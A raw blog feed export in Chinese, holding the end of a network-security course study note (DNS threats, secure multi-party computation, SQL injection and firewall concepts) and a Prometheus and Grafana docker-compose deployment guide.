名称服务器将返回一个列出“example.com”的所有名称服务器的列表。</p><p>在示例中，解析器将向其中一个“example.com”的名称服务器发送对“<a href="http://www.example.com”的查询,该名称服务器可能知道与“www.example.com”相关的/">www.example.com”的查询，该名称服务器可能知道与“www.example.com”相关的</a> IP 地址，并返回这些地址。</p><p><img src="http://azure.wangsiyue.online:9001/vuetest0img/imgs/image-20240630003001676.png" alt="image-20240630003001676"></p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240630003008360.png" alt="image-20240630003008360"></p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240630002954559.png" alt="image-20240630002954559"></p><h2 id="6-4DNS主要安全威胁"><a href="#6-4DNS主要安全威胁" class="headerlink" title="6.4DNS主要安全威胁"></a>6.4DNS主要安全威胁</h2><p><img src="C:/Users/86187/img/image-20240625211636475.png" alt="image-20240625211636475"></p><h3 id="6-4-1-协议脆弱性"><a href="#6-4-1-协议脆弱性" class="headerlink" title="6.4.1 协议脆弱性"></a>6.4.1 协议脆弱性</h3><h4 id="1-域名欺骗"><a href="#1-域名欺骗" class="headerlink" title="1.域名欺骗"></a>1.域名欺骗</h4><h5 id="（1）-事务ID欺骗"><a href="#（1）-事务ID欺骗" class="headerlink" title="（1） 事务ID欺骗"></a>（1） 事务ID欺骗</h5><p>由于客户端会用该ID作为响应数据报是否与查询数据报匹配的判断依据，因此可以<strong>通过伪装DNS服务器提前向客户发送与查询数据报ID相同的响应报文</strong>，只要该伪造的响应报文在真正的响应报文之前到达客户端，就可以实现域名欺骗。<br>对ID是获取主要采用网络监听和序列号猜测两种方法：<br>网络监听比较简单，由于DNS数据报文都没有加密，因此如果攻击者能够监听到客户的网络流量即可获得事务ID。</p><p>攻击者通常使用ARP（Address Resolution Protocol，地址解析协议）欺骗的方法进行监听，但是这种方法要求攻击者必须与客户处于同一网络环境中。<br>为了突破这种限制，攻击者采用序列号猜测的方法来进行欺骗。由于DNS查询报文的事务ID字段为2个字节，限制了其ID值只能是0~65535，大大降低了猜测成功的难度。<br>在此过程中，攻击者通常对提供真实报文的名字服务器发动DoS攻击，延缓正确应答报文返回，从而保证虚假的应答报文提前返回给客户端。</p><h5 id="（2）-缓存投毒"><a href="#（2）-缓存投毒" class="headerlink" title="（2） 缓存投毒"></a>（2） 缓存投毒</h5><p>缓存投毒是指攻击者将“污染”的缓存记录插入到正常的DNS服务器的缓存记录中，所谓污染的缓存记录指DNS解析服务器中域名所对应的IP地址不是真实的地址，而是由攻击者篡改的地址，这些地址通常对应着由攻击者控制的服务器<br>攻击者利用DNS协议中缓存机制中对附加区数据不做任何检查的漏洞，诱骗名字服务器缓存具有较大TTL的虚假资源记录从而达到长期欺骗客户端的目的</p><p>缓存投毒的特点</p><p>攻击具有隐蔽性，不用消耗太多网络资源就可以使性能急剧受损；<br>采用间接攻击方式使得客户端和服务器都受到攻击；<br>使用貌似合法的记录来污染缓存，很难检测出来；<br>目前的缓存设计缺乏相应的反污染机制，对于精心组织的恶意缓存投毒攻击束手无策。</p><h4 id="2-网络通信攻击"><a href="#2-网络通信攻击" class="headerlink" title="2.网络通信攻击"></a>2.网络通信攻击</h4><p>针对 DNS 的网络通信攻击主要是分布式拒绝服务攻击（DDoS攻击）、恶意网址重定向和中间人(man-in-the-middle, MITM)攻击。</p><p>针对DNS的拒绝服务器攻击通常有两种方式：<br>一种是攻击DNS系统本身，包括对名字服务器和客户端进行攻击<br>另一种是利用DNS系统作为反射点来攻击其他目标</p><p>在针对DNS系统客户端的DoS攻击中，主要通过发送否定回答显示域名不存在，从而制造黑洞效应，对客户端造成事实上的DoS攻击。<br>在反射式攻击中，攻击者利用域名服务器作为反射点，用DNS应答对目标进行泛洪攻击。虽然攻击目标不是DNS系统本身，但由于DNS承担域名和IP地址映射任务，攻击者通过查询被攻击目标的域名IP地址，使得DNS收到大量的查询请求从而同样间接受到DoS攻击。</p><p>DNS<strong>域名解析过程劫持</strong><img src="C:/Users/86187/img/image-20240625212622081.png" alt="image-20240625212622081"></p><p>通过对DNS数据包“请求阶段”中的解析路径进行划分，将DNS解析路径分为四类。首先是正常的DNS解析路径，用户的DNS请求只到达指定的公共DNS服务器。此时，权威域名服务器应当只看到一个来自公共服务器的请求。剩下三类均属于DNS解析路径劫持。</p><p>第一类劫持方法是请求转发，用户的DNS请求将直接被定向到其他的服务器。此时，权威域名服务器只收到来自这个服务器的请求，用户指定的公共DNS服务器完全被排除在外。<br>第二类劫持方法是请求复制，用户的DNS请求被网络中间设备复制，一份去往原来的目的地，一份去往劫持者使用的解析服务器，此时，权威域名服务器将收到两个相同的查询。<br>第三类劫持方法是直接应答，用户发生的请求同样被转发，但解析服务器并未进行后续查询而是直接返回一个响应，此时，权威域名服务器没有收到任何查询，但是客户端却收到解析结果。</p><h4 id="6-4-2-实现脆弱性"><a href="#6-4-2-实现脆弱性" class="headerlink" title="6.4.2 实现脆弱性"></a>6.4.2 实现脆弱性</h4><p>DNS 软件，BIND 的漏洞和缺陷 缓冲区溢出漏洞</p><h4 id="6-4-3-操作脆弱性"><a href="#6-4-3-操作脆弱性" class="headerlink" title="6.4.3 操作脆弱性"></a>6.4.3 操作脆弱性</h4><p>由于人为操作或配置错误所带来的安全隐患：<strong>域名配置攻击、域名注册攻击和信息泄漏等</strong></p><h1 id="七、-安全多方计算"><a href="#七、-安全多方计算" class="headerlink" title="七、    安全多方计算"></a>七、    安全多方计算</h1><h2 id="7-1主要技术路线分类"><a href="#7-1主要技术路线分类" class="headerlink" title="7.1主要技术路线分类"></a>7.1主要技术路线分类</h2><p>隐私计算主要有三种技术路线：基于密码学的安全多方计算、联邦学习、可信硬件TEE</p><p><strong>1. 按计算参与方可信程度分类:</strong></p><ul><li><strong>不经意传输（Oblivious Transfer, OT）：</strong> 参与方之间互不信任，需要借助密码学协议来保证数据传输的安全性。</li><li><strong>零知识证明</strong>：证明者向验证者证明并使其相信自己知道或拥有某一消息，但证明过程不能向验证者泄漏任何关于被证明消息的任何信息。</li><li><strong>秘密分享（Secret Sharing, SS）：</strong> 数据被拆分成多份，分别存储在不同的参与方，任何一方都无法单独恢复原始数据。设秘密s被分成n个部分，每一部分被称为一个子秘密并由一个持有者持有，并且大于等于t个参与者所持有的子秘密可以重构秘密s，而少于t个参与者所持有的子秘密无法重构秘密并且无法获得秘密s的任何信息。</li><li><strong>同态加密（Homomorphic Encryption, HE）：</strong> 可以直接对加密数据进行计算，而无需解密，计算结果解密后与对明文计算的结果一致。</li><li><strong>隐私集合求交</strong>：允许持有各自集合的多方来共同计算集合的交集，而计算的最后，各参与方只能得到正确的交集，而不会得到交集以外另一方集合中的任何信息。</li><li><strong>混合协议：</strong> 实际应用中，通常会结合多种技术来实现安全多方计算，例如结合秘密共享和同态加密。</li></ul><h2 id="7-2基础秘密分享协议，三元加法分享、三元乘法分享等"><a href="#7-2基础秘密分享协议，三元加法分享、三元乘法分享等" class="headerlink" title="7.2基础秘密分享协议，三元加法分享、三元乘法分享等"></a>7.2基础秘密分享协议，三元加法分享、三元乘法分享等</h2><p><strong>P20-P37 案例</strong>（题）</p><h1 id="八、-Web安全"><a href="#八、-Web安全" class="headerlink" title="八、    Web安全"></a>八、    Web安全</h1><h2 id="8-1-万维网，主要的体系架构"><a href="#8-1-万维网，主要的体系架构" class="headerlink" title="8.1 万维网，主要的体系架构"></a>8.1 万维网，主要的体系架构</h2><p><img src="C:/Users/86187/img/image-20240630000101420.png" alt="image-20240630000101420"></p><p>万维网以客户服务器方式工作。<br>在用户计算机上运行的万维网客户程序称为浏览器。<br>（360浏览器，IE浏览器，Chrome浏览器）<br>万维网文档所驻留的计算机则运行服务器程序，因此，这个计算机也称为万维网服务器或Web服务器。<br>（IIS服务器，Apache HTTP服务器）<br><strong>客户程序通过HTTP或HTTPS协议向服务器程序发出请求，服务器程序向客户程序返回客户所要的万维网文档。</strong></p><p><strong>在一个客户程序主窗口上显示出的万维网文档称为页面</strong>。</p><p>它是一种基于超文本和超文本传输协议（HTTP）的、全球性的、动态交互的、跨平台的分布式图形信息系统。</p><p><strong>以下是网上搜的：</strong></p><p>万维网 (World Wide Web, WWW) 是一个基于互联网的庞大信息空间，它采用客户端&#x2F;服务器架构，主要由以下几个核心组件构成：</p><p><strong>1. 统一资源定位符 (URL): 网页的“地址”</strong></p><p>URL 用于标识和定位万维网上的资源，例如网页、图片、视频等。它就像网络资源的门牌号，告诉浏览器去哪里找到所需的资源。</p><ul><li><p>示例：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.example.com/index.html</span><br></code></pre></td></tr></table></figure><ul><li><code>https</code> : 协议类型，表示使用安全超文本传输协议。</li><li><code>www.example.com</code> : 域名，表示服务器的地址。</li><li><code>/index.html</code> : 路径，表示服务器上具体资源的位置。</li></ul></li></ul><p><strong>2. 超文本传输协议 (HTTP): 网页的“信使”</strong></p><p>HTTP 是一种应用层协议，用于客户端和服务器之间传输超文本数据。它定义了浏览器和服务器之间如何建立连接、请求和传输数据，以及如何处理响应等规则。</p><ul><li><strong>请求 (Request):</strong> 浏览器向服务器发送请求，例如获取网页、提交表单数据等。</li><li><strong>响应 (Response):</strong> 服务器根据请求返回相应的数据，例如网页内容、状态码等。</li></ul><p><strong>3. 超文本标记语言 (HTML): 网页的“内容”</strong></p><p>HTML 是一种标记语言，用于创建网页的结构和内容。它使用标签来定义文本、图像、链接和其他元素，浏览器根据这些标签来解析和显示网页。</p><ul><li><strong>示例：</strong> <code>&lt;h1&gt;这是一个标题&lt;/h1&gt; &lt;p&gt;这是一段文本。&lt;/p&gt;</code></li></ul><p><strong>4. 网页浏览器: 网页的“阅读器”</strong></p><p>网页浏览器是用户访问万维网的入口，它负责解析和渲染网页，将 HTML 代码转换成用户可读的内容。常见的浏览器有 Chrome、Firefox、Safari 等。</p><ul><li>功能：<ul><li>发送 HTTP 请求获取网页数据。</li><li>解析 HTML 代码，构建网页结构。</li><li>渲染网页内容，包括文本、图像、视频等。</li><li>处理用户交互，例如点击链接、填写表单等。</li></ul></li></ul><p><strong>5. Web 服务器: 网页的“保管员”</strong></p><p>Web 服务器是存储和提供网页资源的计算机，它接收来自浏览器的 HTTP 请求，并返回相应的网页数据。常见的 Web 服务器有 Apache、Nginx 等。</p><ul><li>功能：<ul><li>监听特定端口，接收 HTTP 请求。</li><li>处理 HTTP 请求，找到对应的网页资源。</li><li>返回 HTTP 响应，将网页数据发送给浏览器。</li></ul></li></ul><h2 id="8-2SQL注入攻击、风险，典型的SQL注入过程"><a href="#8-2SQL注入攻击、风险，典型的SQL注入过程" class="headerlink" title="8.2SQL注入攻击、风险，典型的SQL注入过程"></a>8.2SQL注入攻击、风险，典型的SQL注入过程</h2><p>SQL注入攻击<strong>通过构建特殊的输入作为参数</strong>传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，它目前是黑客对数据库进行攻击的最常用手段之一。</p><p><strong>SQL注入攻击以网站数据库为目标，利用Web应用程序对特殊字符串过滤分完全的缺陷，通过把精心构造的SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串中，欺骗服务器执行恶意的SQL命令，最终达到非法访问网站数据库内容、篡改数据库中的数据、绕过认证（不需要掌握用户名和口令就可登录应用程序）、运行程序、浏览或编辑文件等目的。</strong></p><p>！看案例（ppt太多，不整理）</p><h1 id="九、-网路防火墙"><a href="#九、-网路防火墙" class="headerlink" title="九、   网路防火墙"></a>九、   网路防火墙</h1><h2 id="9-1防火墙工作原理"><a href="#9-1防火墙工作原理" class="headerlink" title="9.1防火墙工作原理"></a>9.1防火墙工作原理</h2><p>允许数据流通过</p><p>拒绝数据流通过，并向发送者回复一条消息，提示发送者该数据流已被拒绝。</p><p>将数据流丢弃，不对这些数据包进行任何处理，也不会向发送者发送任何提示信息。</p><p>所有进出网络的数据流都必须经过防火墙。</p><p>只允许经过授权的数据流通过防火墙</p><p>防火墙自身对入侵是免疫的。</p><h2 id="9-2防火墙主要的技术方式"><a href="#9-2防火墙主要的技术方式" class="headerlink" title="9.2防火墙主要的技术方式"></a>9.2防火墙主要的技术方式</h2><h3 id="9-2-1-包过滤技术"><a href="#9-2-1-包过滤技术" class="headerlink" title="9.2.1 包过滤技术"></a>9.2.1 包过滤技术</h3><p>包过滤（Packet Filtering）作用在网络层和传输层，根据数据包的包头信息（源和目的IP地址、端口号、标志位等），依据事先设定的过滤规则，决定是否允许数据包通过。包过滤防火墙相当于一个具有包过滤功能的路由器</p><h4 id="包过滤操作的六项要求"><a href="#包过滤操作的六项要求" class="headerlink" title="包过滤操作的六项要求:"></a>包过滤操作的六项要求:</h4><p>包过滤防火墙相当于一个具有包过滤功能的路由器</p><p>包过滤设备必须存储包过滤规则；<br>当包到达端口时，分析IP、TCP或UDP报文头中的字段。</p><h5 id="包过滤规则的存储顺序与应用顺序相同；"><a href="#包过滤规则的存储顺序与应用顺序相同；" class="headerlink" title="包过滤规则的存储顺序与应用顺序相同；"></a>包过滤规则的存储顺序与应用顺序相同；</h5><p>如果一条规则阻止包传输，此包便被丢弃；<br>如果一条规则允许包传输，此包可正常通过；<br>如果一个包不满足任何一条规则，则丢弃</p><p>包过滤技术的优点：<br>用一个放置在重要位置上的包过滤路由器即可保护整个网络，这样，不管内部网的站点规模多大，只要在路由器上设置合适的包过滤，各站点均可获得良好的安全保护；<br>包过滤工作对用户来说是透明的。包过滤不需用户软件支持，也不要对客户机做特殊设置；<br>包过滤技术是一种有效而通用的控制网络流量的方法，经常作为不可信网络的第一层防卫；可以有效阻塞公开的恶意站点的信息流。</p><p>包过滤技术的缺点：<br>仅依赖网络层和传输层信息，如IP地址、端口号、TCP标志等，只能“就事论事”地进行安全判决。由于缺少信息，一些协议如RPC、UDP难以有效过滤；<br>支持规则的数量有限，规则过多会降低效率。<br>正确制定规则并不容易</p><h3 id="9-2-2-状态检测技术"><a href="#9-2-2-状态检测技术" class="headerlink" title="9.2.2 状态检测技术"></a>9.2.2 状态检测技术</h3><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240629235214719.png" alt="image-20240629235214719"></p><p>状态检测又称动态包过滤，在网络层由一个检查引擎截获数据包，抽取出与应用层状态有关的信息，并以此作为依据决定对该数据包是接受还是拒绝。<br>检查引擎维护一个<strong>动态的状态信息表</strong>并对后续的数据包进行检查。一旦发现任何连接的参数有意外变化，该连接就被中止<br>它在协议底层截取数据包，然后分析这些数据包，并且将当前数据包和状态信息与前一时刻的数据包和状态信息进行比较，从而得到该数据包的控制信息，来达到保护网络安全的目的</p><h3 id="9-2-3-应用网关防火墙"><a href="#9-2-3-应用网关防火墙" class="headerlink" title="9.2.3 应用网关防火墙"></a>9.2.3 应用网关防火墙</h3><p><img src="C:/Users/86187/img/image-20240629235300244.png" alt="image-20240629235300244"></p><p><img src="http://azure.wangsiyue.online:9001/vuetest0img/imgs/image-20240626003121095.png" alt="image-20240626003121095"></p><p>问题：网络内部如果有一个存在安全漏洞的应用，但厂商尚未发布相应的补丁信息来弥补该缺陷，怎么办？<br>应用代理可以有效解决该问题，应用代理可以被配置来识别尝试攻击应用程序安全漏洞的恶意流量，进而保护运行了不安全应用的系统。</p><p><img src="http://azure.wangsiyue.online:9001/vuetest0img/imgs/image-20240629235339028.png" alt="image-20240629235339028"></p><p>新型的自适应代理(Adaptive proxy)防火墙，本质上也属于代理服务技术，但它也结合了动态包过滤(状态检测)技术组成这类防火墙的基本要素有两个：<strong>自适应代理服务器与动态包过滤器</strong>。<strong>自适应代理就可以根据用户的配置信息，决定是使用代理服务器从应用层代理请求，还是使用动态包过滤器从网络层转发包。</strong></p><h4 id="下一代防火墙"><a href="#下一代防火墙" class="headerlink" title="下一代防火墙"></a>下一代防火墙</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;
# 一、    计算机网络概述

&lt;h2 id=&quot;1-1-计算机网络结构和组成，典型的网络体系结构；网络协议及封装协议；&quot;&gt;&lt;a href=&quot;#1-1-计算机网络结构和组成，典型的网络体</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Prometheus 部署配置</title>
    <link href="http://example.com/2024/06/10/Prometheus-%E9%83%A8%E7%BD%B2%E9%85%8D%E7%BD%AE/"/>
    <id>http://example.com/2024/06/10/Prometheus-%E9%83%A8%E7%BD%B2%E9%85%8D%E7%BD%AE/</id>
    <published>2024-06-10T05:46:53.000Z</published>
    <updated>2024-06-18T06:26:06.214Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Prometheus-Grafana"><a href="#Prometheus-Grafana" class="headerlink" title="Prometheus + Grafana"></a>Prometheus + Grafana</h1><p>基于docker-compose部署Prometheus + Grafana </p><h2 id="安装数据收集器-node-exporter"><a href="#安装数据收集器-node-exporter" class="headerlink" title="安装数据收集器 node-exporter"></a>安装数据收集器 node-exporter</h2><h3 id="安装-node-exporter"><a href="#安装-node-exporter" class="headerlink" title="安装 node-exporter"></a>安装 node-exporter</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> /opt<br><span class="hljs-attribute">sudo</span> wget https://github.com/prometheus/node_exporter/releases/download/v1.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>/node_exporter-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.linux-amd64.tar.gz<br><span class="hljs-attribute">sudo</span> tar zxf node_exporter-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.linux-amd64.tar.gz<br><span class="hljs-attribute">sudo</span> mv node_exporter-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.linux-amd64 node_exporter<br><span class="hljs-attribute">sudo</span> mv node_exporter /usr/local/<br></code></pre></td></tr></table></figure><p>运行如下命令测试 node-exporter 收集器启动情况，正常情况下会输出服务端口。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/node_exporter/</span>node_exporter<br></code></pre></td></tr></table></figure><h3 id="添加到系统服务"><a href="#添加到系统服务" class="headerlink" title="添加到系统服务"></a>添加到系统服务</h3><p>sudo vim &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;node_exporter.service<br>添加如下内容</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=mysqld_exporter<br><span class="hljs-attr">After</span>=network.target<br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">ExecStart</span>=/usr/local/node_exporter/node_exporter<br><span class="hljs-attr">Restart</span>=<span class="hljs-literal">on</span>-failure<br><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=multi-user.target<br></code></pre></td></tr></table></figure><h3 id="加载并重启服务"><a href="#加载并重启服务" class="headerlink" title="加载并重启服务"></a>加载并重启服务</h3><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-comment"># 加载配置</span><br>sudo <span class="hljs-params">system</span>ctl daemon-reload<br><span class="hljs-comment"># 启动服务</span><br>sudo <span class="hljs-params">system</span>ctl restart node_exporter.service<br><span class="hljs-comment"># 查看服务状态</span><br>sudo <span class="hljs-params">system</span>ctl status node_exporter.service<br><span class="hljs-comment"># 配置开机启动</span><br>sudo <span class="hljs-params">system</span>ctl enable node_exporter.service<br></code></pre></td></tr></table></figure><h3 id="查看数据收集情况"><a href="#查看数据收集情况" class="headerlink" title="查看数据收集情况"></a>查看数据收集情况</h3><p>重新起一个终端，查看数据收集情况。也可以在浏览器中查看。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl http:<span class="hljs-comment">//127.0.0.1:9100/metrics</span><br></code></pre></td></tr></table></figure><h2 id="docker-compse部署"><a href="#docker-compse部署" class="headerlink" title="docker-compse部署"></a>docker-compse部署</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>docker-compose.yml文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&quot;3&quot;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">prometheus:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">prom/prometheus</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">prometheus</span><br>    <span class="hljs-attr">user:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;9090:9090&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./conf/prometheus:/etc/prometheus</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./data/prometheus/prometheus_db:/prometheus</span><br>    <span class="hljs-attr">command:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;--config.file=/etc/prometheus/prometheus.yml&#x27;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;--storage.tsdb.path=/prometheus&#x27;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;--web.console.libraries=/usr/share/prometheus/console_libraries&#x27;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;--web.console.templates=/usr/share/prometheus/consoles&#x27;</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">net-prometheus</span><br><br>  <span class="hljs-attr">grafana:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">grafana/grafana</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">grafana</span><br>    <span class="hljs-attr">user:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;53000:3000&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-comment">#- ./conf/grafana:/etc/grafana</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./data/prometheus/grafana_data:/var/lib/grafana</span><br>    <span class="hljs-attr">depends_on:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">prometheus</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">net-prometheus</span><br><br>  <span class="hljs-attr">pushgateway:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">prom/pushgateway</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">pushgateway</span><br>    <br>    <span class="hljs-attr">user:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;9091:9091&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./data/prometheus/pushgateway_data:/var/lib/pushgateway</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">net-prometheus</span><br><br>  <span class="hljs-attr">alertmanager:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">prom/alertmanager</span><br>    <span class="hljs-attr">hostname:</span> <span class="hljs-string">alertmanager</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">alertmanager</span><br>    <br>    <span class="hljs-attr">user:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;9093:9093&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./conf/alertmanager:/etc/alertmanager</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./data/prometheus/alertmanager_data:/var/lib/alertmanager</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">net-prometheus</span><br><br><span class="hljs-attr">networks:</span><br>  <span class="hljs-attr">net-prometheus:</span><br><br></code></pre></td></tr></table></figure><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose up -d</span><br></code></pre></td></tr></table></figure><h3 id="prometheus配置文件"><a href="#prometheus配置文件" class="headerlink" title="prometheus配置文件"></a>prometheus配置文件</h3><p>prometheus.yml文件</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-meta"># 全局配置</span><br><span class="hljs-symbol">global:</span><br>  <span class="hljs-meta"># 抓取间隔，每5秒抓取一次指标</span><br><span class="hljs-symbol">  scrape_interval:</span> <span class="hljs-number">5</span>s<br>  <span class="hljs-meta"># 评估规则的频率，每5秒评估一次</span><br><span class="hljs-symbol">  evaluation_interval:</span> <span class="hljs-number">5</span>s<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">  external_labels:</span><br><span class="hljs-symbol">    monitor:</span> <span class="hljs-string">&quot;dashboard&quot;</span><br><br><span class="hljs-meta"># 警报配置</span><br><span class="hljs-symbol">alerting:</span><br><span class="hljs-symbol">  alertmanagers:</span><br>    <span class="hljs-meta"># 定义 Alertmanager 实例</span><br>    - static_configs:<br>        - targets:<br>            - <span class="hljs-string">&quot;192.168.0.100:9093&quot;</span> <br><br><span class="hljs-meta"># 规则文件路径</span><br><span class="hljs-symbol">rule_files:</span><br>  - <span class="hljs-keyword">/etc/</span>prometheus<span class="hljs-keyword">/rules/</span>*.rules<br><br><span class="hljs-meta"># 采集配置</span><br><span class="hljs-symbol">scrape_configs:</span><br>  <span class="hljs-meta"># 采集 Prometheus 自身指标</span><br>  - job_name: <span class="hljs-string">&quot;prometheus&quot;</span><br><span class="hljs-symbol">    scrape_interval:</span> <span class="hljs-number">5</span>s<br><span class="hljs-symbol">    static_configs:</span><br>      - targets: [<span class="hljs-string">&quot;172.19.0.2:9090&quot;</span>] <span class="hljs-meta"># Prometheus 实例地址</span><br><br>  <span class="hljs-meta"># 采集 AWS 指标</span><br>  - job_name: <span class="hljs-string">&quot;server&quot;</span><br><span class="hljs-symbol">    static_configs:</span><br>      - targets: [<span class="hljs-string">&quot;server_IP_1:9100&quot;</span>]  <span class="hljs-meta"># 替换为实际的实例 IP</span><br></code></pre></td></tr></table></figure><p>参考文章：<br><a 